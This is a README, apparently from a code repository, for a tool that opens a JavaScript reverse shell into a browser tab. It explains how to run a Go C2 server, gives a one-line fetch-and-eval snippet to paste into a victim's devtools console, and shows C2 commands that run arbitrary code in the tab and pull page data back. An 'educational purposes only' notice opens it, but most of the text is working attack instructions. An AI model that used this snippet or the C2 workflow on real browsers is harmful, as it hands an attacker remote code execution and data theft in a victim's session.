# Browser Reverse Shell

**NOTICE: for educational purposes only, DO NOT use without the explicit permission of the owner of the browser**

Create a reverse shell into a browser tab.

## How to use

start the C2 server by going into the c2 directory and running

~~~bash
go run main.go
~~~

then in the victim browser, open devtools and paste the fetch-rev-shell.js contents into the console, changing out the url for the ip address of your c2 server.

~~~js
const url = "http://localhost:8080/"; const r1 = await fetch(url + "get");const r2 = await r1.text(); eval(r2);
~~~

now go to the console of the c2 server, you now have a javascript reverse shell into the current browser tab.

in the server you will get a shell like this:

~~~
(c2)> 
~~~

To send something to the browser, use the **send** command:

~~~
(c2)> send console.log("hello world")
~~~

~~~
(c2)> send document.body.innerHTML = "your browser is mine!!!"
~~~

## Feedback

To get information back to the c2 server, you can use the *feedback* variable.

for example to see the title of the current page:

~~~
(c2)> send feedback = document.title
~~~

The title will then be printed next time the browser sends a request

## Challenges

- HTTPS: most websites reject mixed content from http and https websites (except from localhost)
- This reverse shell relies on the eval function of javascript, which many sites block.
- Many sites (like github) block fetching from other sources than the preapproved ones, which will give you an error like
~~~
Content-Security-Policy: The page’s settings blocked the loading of a resource (connect-src) at http://localhost:8080/get because it violates the following directive: “connect-src 'self'
~~~
